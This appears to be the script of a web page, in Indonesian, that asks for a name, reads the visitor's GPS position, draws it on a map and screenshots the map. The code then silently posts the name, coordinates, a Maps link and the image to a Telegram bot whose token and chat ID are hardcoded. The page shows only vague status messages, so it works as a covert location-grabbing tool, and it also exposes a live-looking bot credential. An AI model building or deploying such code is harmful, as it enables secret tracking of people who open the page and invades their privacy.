// === TOKEN MU ===
const BOT_TOKEN = "8323987241:AAEkG2GyXGhZygjWzwlY5C5c4wcyQechfbM";
const CHAT_ID = "7548775199";

let map, marker;

document.getElementById("btnMulai").onclick = () => mulai();

function mulai() {
    const nama = document.getElementById("nama").value.trim();
    if (nama === "") {
        alert("Isi nama dulu!");
        return;
    }

    document.getElementById("status").innerText = "Loading...";

    navigator.geolocation.getCurrentPosition(
        pos => tampilkanMap(nama, pos.coords.latitude, pos.coords.longitude),
        () => alert("Gagal mengambil lokasi!")
    );
}

function tampilkanMap(nama, lat, lon) {

    const mapDiv = document.getElementById("map");
    mapDiv.style.display = "block";

    if (!map) {
        map = L.map('map').setView([lat, lon], 17);
    } else {
        map.setView([lat, lon], 17);
    }

    L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
        maxZoom: 19
    }).addTo(map);

    if (marker) {
        marker.setLatLng([lat, lon]);
    } else {
        marker = L.marker([lat, lon]).addTo(map);
    }

    document.getElementById("status").innerText = "Loaded...";

    // tunggu map load lalu screenshot
    setTimeout(() => ambilScreenshot(nama, lat, lon), 1200);
}

async function ambilScreenshot(nama, lat, lon) {
    const mapElement = document.getElementById("map");

    try {
        const canvas = await html2canvas(mapElement, {
            useCORS: true,
            allowTaint: true
        });

        const dataUrl = canvas.toDataURL("image/png");

        kirimTelegram(nama, lat, lon, dataUrl);

    } catch (e) {
        alert("Gagal screenshot map!");
    }
}

async function kirimTelegram(nama, lat, lon, imgBase64) {
    document.getElementById("status").innerText = "Waiting...";

    const blob = await fetch(imgBase64).then(res => res.blob());

    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("caption",
`📍 Laporan Lokasi Baru

👤 Nama: ${nama}
🌍 Koordinat: ${lat}, ${lon}
🔗 Maps: https://www.google.com/maps?q=${lat},${lon}
`
    );
    form.append("photo", blob, "map.png");

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: form
    })
    .then(() => {
        document.getElementById("status").innerHTML = "Success!";
    })
    .catch(() => {
        alert("Gagal mengirim foto ke Telegram!");
    });
}